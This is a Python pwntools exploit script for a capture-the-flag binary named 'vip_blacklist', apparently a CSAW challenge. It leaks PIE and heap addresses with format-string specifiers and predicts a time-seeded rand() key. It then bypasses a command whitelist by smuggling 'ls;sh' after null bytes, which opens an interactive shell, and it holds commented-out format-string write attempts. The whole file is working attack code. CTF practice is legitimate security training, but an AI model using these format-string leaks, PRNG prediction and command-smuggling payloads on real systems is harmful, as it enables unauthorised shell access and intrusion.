from pwn import *
from ctypes import CDLL
from datetime import datetime

'''

    Goal:
     - get string 'queue' inside whitelist
     - match the 'randNum' or whatever with datetime shit

'''

elf = context.binary = ELF("./vip_blacklist")
gs = '''
    

'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()
#io = remote("vip-blacklist.ctf.csaw.io", 9999)

# ===========================

# pie leak @ %28$p
io.sendline(b"%28$p")
io.recvuntil(b"Executing: ")

leak = io.recvuntil(b"...")
leak = leak.split(b"...")[0]
leak = int(leak, 16)

pie = leak - (0x1409 + 88)
print("PIE Leak: " + hex(pie))

# Heap leak @ %8$p
io.sendline(b"%8$p")
io.recvuntil(b"Executing: ")

leak = io.recvuntil(b"...")
leak = leak.split(b"...")[0]
leak = int(leak, 16)

heap = leak - 0x2a0
print("Heap Leak: " + hex(heap))

# overwrite whitelist
#payload = fmtstr_payload(8, {(pie + 0x401c): b"a"})
#io.sendline(payload)

'''
# write /bin/sh in heap?!?!?!
bin_sh = b"/bin/sh\x00"

for i in range(len(bin_sh)):
    payload = fmtstr_payload(8, {heap + (0x2a0 + i):bin_sh[i]})
    print(len(payload))
    io.sendline(payload)

'''
# get into the queue
d = datetime.now()
libc = CDLL("/usr/lib/libc.so.6")
timestamp = libc.time(0)
libc.srand(timestamp)

key = 0;
for i in range(10):
    rand = libc.rand()
    last_byte = hex(rand)[-2:]
    
    key += int(last_byte, 16) << (8 * i)

modified = p64(key & 0xffffffffffffffff) + p64(key >> 64)

io.sendline(modified)
print(hex(key))

io.sendline(b"queue\x00clear\x00exit\x00\x00ls;sh")
io.sendline(b"ls;sh")

# ===========================

io.interactive()

